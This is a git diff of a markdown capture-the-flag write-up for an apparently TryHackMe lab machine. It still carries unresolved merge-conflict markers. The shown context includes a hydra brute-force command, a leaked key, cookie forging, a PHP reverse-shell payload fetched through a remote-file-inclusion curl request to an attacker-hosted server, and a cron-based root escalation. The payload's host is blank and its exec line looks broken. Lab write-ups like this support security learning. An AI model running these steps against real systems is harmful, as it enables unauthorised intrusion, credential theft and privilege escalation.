@@ -87,8 +87,6 @@ static       (Status: 301)
 support      (Status: 301)
 ```
 
-![Gobuster:](tryhackme/domino/screenshots/1gobuster.jpg)
-
 **What this tells me / what's next:** `/admin/` and `/api/` are expected on a portal like this, but `/backup/` immediately stands out. That's the first place I dig into.
 
 Visiting `/backup/` shows a `README`:
@@ -104,8 +102,12 @@ Separately, the login page itself linked to two pages worth reading before touch
 
 **Why this matters:** an encrypted backup and a valid username list are two very different but equally useful things. One tells me there's a secret to find; the other tells me _who_ to try to become. Both come from pages nobody explicitly hid — the app leaked its own attack surface just by existing.
 
+<<<<<<< HEAD
 ![Screenshot:](screenshots/5users.jpg)
 ![Screenshot:](screenshots/4backupreadme.jpg)
+=======
+`![Screenshot: /backup/README.txt contents]` `![Screenshot: team.php page showing employee emails/usernames]`
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -129,8 +131,12 @@ _backupKey: 'N3xusK3y2024!!'
 
 **What this tells me / what's next:** I now have the AES key needed to decrypt `config.enc`. Next step: decrypt the backup.
 
+<<<<<<< HEAD
 ![/Backup:](screenshots/3staticapijs.jpg)
 
+=======
+`![Screenshot: app.js source showing the leaked key]` ![/Backup:](../../.gitbook/assets/3staticapijs.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -159,9 +165,13 @@ cat config_decrypted
 
 **What this tells me / what's next:** this names a real system account — `devops` — that exists on the server. Worth noting for later; it becomes important during privilege escalation. For now, the web app's login is still the main target.
 
+<<<<<<< HEAD
 
 ![Screenshot:](screenshots/decrypt.jpg)
 
+=======
+`![Screenshot: decrypted config.enc contents]` ![Screenshot:](../../.gitbook/assets/3staticapijs.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -192,7 +202,11 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-
 
 **What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
 
+<<<<<<< HEAD
 ![Screenshot:](screenshots/hydra.jpg)
+=======
+`![Screenshot: hydra output showing the cracked sarah.johnson credentials]` `![Screenshot: successful login as sarah.johnson, session cookie set]` ![Screenshot:](../../.gitbook/assets/hydra.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -261,9 +275,13 @@ setcookie('nexus_session', $cookie_data . '.' . $sig, ...);
 
 The cookie is just `base64(json) + "." + HMAC-SHA256(json, APP_SECRET)` — no server-side session table backing it. With the signing secret in hand, I can build a valid cookie for _any_ user entirely on my own machine.
 
+<<<<<<< HEAD
 
 ![Screenshot:](screenshots/config.jpg)
 
+=======
+`![Screenshot: files.php leaking config.php]` ![Screenshot:](../../.gitbook/assets/config.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -291,6 +309,7 @@ print(forged_cookie)
 
 **Flag 2:** `THM{flag2}`
 
+<<<<<<< HEAD
 
 ![Screenshot:](screenshots/forgecookie.jpg)
 ![Screenshot:](screenshots/adminprog.jpg)
@@ -298,6 +317,9 @@ print(forged_cookie)
 
 
 
+=======
+`![Screenshot: forged cookie set in browser dev tools]` `![Screenshot: admin panel access showing flag 2]` ![Screenshot:](../../.gitbook/assets/forgecookie.jpg) ![Screenshot:](../../.gitbook/assets/adminprog.jpg) ![Screenshot:](../../.gitbook/assets/adminco.png)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
@@ -316,7 +338,8 @@ Saved the payload as `reverse.php`:
 $sock = fsockopen("", 9001);
 exec("sh &3 2>&3");
 ```
-![Screenshot:](screenshots/revshell.jpg)
+
+![Screenshot:](../../.gitbook/assets/revshell.jpg)
 
 Hosted the payload with a quick Python web server:
 
@@ -343,9 +366,7 @@ curl 'http://<ip>/api/files.php?name=http://:8000/reverse.php' \
 
 ## `![Screenshot: reverse shell landing as www-data]` `![Screenshot: locating and reading flag 3 on disk]`
 
-![Screenshot:](screenshots/gotshell.jpg)
-
-
+![Screenshot:](../../.gitbook/assets/gotshell.jpg)
 
 ## 10. Moving Sideways — www-data to devops
 
@@ -366,15 +387,18 @@ whoami
 devops
 ```
 
+<<<<<<< HEAD
 
 ![Screenshot:](screenshots/lateral.jpg)
+=======
+`![Screenshot: su to devops succeeding]` ![Screenshot:](../../.gitbook/assets/lateral.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
 ## 11. Flag 4 — Becoming Root via Cron
 
-**Why I did this:** as a normal user, cron jobs running periodically as root are one of the highest-value, lowest-cost privilege escalation checks available. `pspy` observes process activity system-wide without needing any special privileges.
-Transfer the pspy from your device to the target ip using python server.
+**Why I did this:** as a normal user, cron jobs running periodically as root are one of the highest-value, lowest-cost privilege escalation checks available. `pspy` observes process activity system-wide without needing any special privileges. Transfer the pspy from your device to the target ip using python server.
 
 **Command:**
 
@@ -392,7 +416,7 @@ CMD: UID=0  PID=3133  | /bin/bash /opt/monitoring/health_report.sh
 
 Confirmed the script was writable by `devops`:
 
-![Screenshot:](screenshots/pspy.jpg)
+![Screenshot:](../../.gitbook/assets/pspy.jpg)
 
 ```bash
 ls -la /opt/monitoring/health_report.sh
@@ -419,9 +443,13 @@ cat /root/root.txt
 
 **Flag 4 (root):** `THM{flag4}`
 
+<<<<<<< HEAD
 
 ![Screenshot:](screenshots/root.jpg)
 ![Screenshot:](screenshots/realroot.jpg)
+=======
+`![Screenshot: pspy64 catching the root cron job]` `![Screenshot: SUID bash confirmed, root shell, and flag 4]` ![Screenshot:](../../.gitbook/assets/root.jpg) ![Screenshot:](../../.gitbook/assets/realroot.jpg)
+>>>>>>> 71e5f3a54e950100c14a9c0cf6843b20f1f5be60
 
 ***
 
